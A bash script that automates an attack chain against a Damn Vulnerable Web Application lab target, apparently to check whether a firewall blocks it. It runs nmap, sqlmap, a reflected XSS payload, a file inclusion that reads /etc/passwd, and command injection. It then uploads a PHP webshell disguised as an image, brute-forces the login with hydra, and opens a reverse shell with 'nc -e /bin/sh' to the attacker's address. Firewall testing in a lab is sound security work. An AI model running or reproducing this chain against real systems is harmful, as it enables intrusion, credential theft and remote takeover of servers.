#!/bin/bash
set -u

TARGET="${1:?Usage: $0 <target-public-ip>}"
BASE="http://${TARGET}"
ATTACKER_IP="$(hostname -I | awk '{print $1}')"
LSHELL_PORT="${LSHELL_PORT:-4444}"
RUN_DIR="/root/lab/evidence/$(date +%Y%m%d-%H%M%S)"
COOKIE_JAR="${RUN_DIR}/cookies.txt"
SUMMARY="${RUN_DIR}/summary.txt"

mkdir -p "${RUN_DIR}"
echo "Target: ${TARGET} (attacker: ${ATTACKER_IP})" | tee "${SUMMARY}"
echo "Evidence dir: ${RUN_DIR}"

phase() {
  echo "" | tee -a "${SUMMARY}"
  echo "==== $1 ====" | tee -a "${SUMMARY}"
}

run_cmd() {
  local name="$1"
  shift
  echo ">> $name: $*" | tee -a "${SUMMARY}"
  timeout "${TIMEOUT_SECONDS:-120}" "$@" 2>&1 | tee "${RUN_DIR}/${name}.log"
  echo ">> $name exit=$? — log: ${RUN_DIR}/${name}.log" | tee -a "${SUMMARY}"
}

phase "Step 0 — DVWA login"
curl -s -c "${COOKIE_JAR}" "${BASE}/login.php" > /dev/null
curl -s -b "${COOKIE_JAR}" -c "${COOKIE_JAR}" \
  -d "username=admin&password=password&Login=Login" "${BASE}/login.php" > /dev/null
if curl -s -b "${COOKIE_JAR}" "${BASE}/index.php" | grep -q "Welcome to Damn Vulnerable Web Application"; then
  echo "LOGIN OK" | tee -a "${SUMMARY}"
else
  echo "LOGIN FAILED — check NGFW WAF is not blocking legit login" | tee -a "${SUMMARY}"
fi
PHPSESSID="$(grep -oP 'PHPSESSID\s+\K.*' "${COOKIE_JAR}")"

phase "Phase 1 — Reconnaissance (nmap)"
run_cmd "nmap" nmap -sS -sV -p- "${TARGET}"

phase "Phase 2.1 — SQL Injection (sqlmap)"
run_cmd "sqlmap" sqlmap -u "${BASE}/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=${PHPSESSID}" --batch

phase "Phase 2.2 — Reflected XSS"
run_cmd "xss" curl -s -b "${COOKIE_JAR}" \
  "${BASE}/vulnerabilities/xss_r/?name=<script>alert(1)</script>"

phase "Phase 2.3 — Local File Inclusion"
run_cmd "lfi" curl -s -b "${COOKIE_JAR}" \
  "${BASE}/vulnerabilities/fi/?page=../../../../etc/passwd"

phase "Phase 2.4 — Command Injection"
run_cmd "cmdi" curl -s -b "${COOKIE_JAR}" \
  -d "ip=127.0.0.1%3B+whoami&Submit=Submit" "${BASE}/vulnerabilities/exec/"

phase "Phase 2.5 — Webshell Upload"
echo '<?php system($_GET["cmd"]); ?>' > "${RUN_DIR}/shell.php"
run_cmd "upload" curl -s -b "${COOKIE_JAR}" \
  -F "uploaded=@${RUN_DIR}/shell.php;type=image/png" -F "Upload=Upload" \
  "${BASE}/vulnerabilities/upload/"

phase "Phase 3 — Brute Force (hydra, top 200 passwords)"
if [ -f /usr/share/wordlists/rockyou.txt ]; then
  head -n 200 /usr/share/wordlists/rockyou.txt > "${RUN_DIR}/top200.txt"
  run_cmd "hydra" hydra -l admin -P "${RUN_DIR}/top200.txt" http-get-form \
    "${BASE}/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"
else
  echo "SKIP: rockyou.txt not found (install wordlists or supply -P yourself)" | tee -a "${SUMMARY}"
fi

phase "Phase 4 — Reverse Shell"
bash /root/lab/reverse-shell-listener.sh "${LSHELL_PORT}" > "${RUN_DIR}/listener.log" 2>&1 &
LISTENER_PID=$!
sleep 1
curl -s -b "${COOKIE_JAR}" --max-time 10 \
  "${BASE}/hackable/uploads/shell.php?cmd=nc+-e+/bin/sh+${ATTACKER_IP}+${LSHELL_PORT}" \
  | tee "${RUN_DIR}/shell-trigger.log"
sleep 3
if grep -qi "connect to" "${RUN_DIR}/listener.log"; then
  echo "REVERSE SHELL CONNECTED (check listener.log)" | tee -a "${SUMMARY}"
else
  echo "REVERSE SHELL NO CONNECTION (expected if NGFW blocked egress)" | tee -a "${SUMMARY}"
fi
kill "${LISTENER_PID}" 2>/dev/null

phase "DONE — evidence in ${RUN_DIR}"
echo "Review: cat ${SUMMARY}" | tee -a "${SUMMARY}"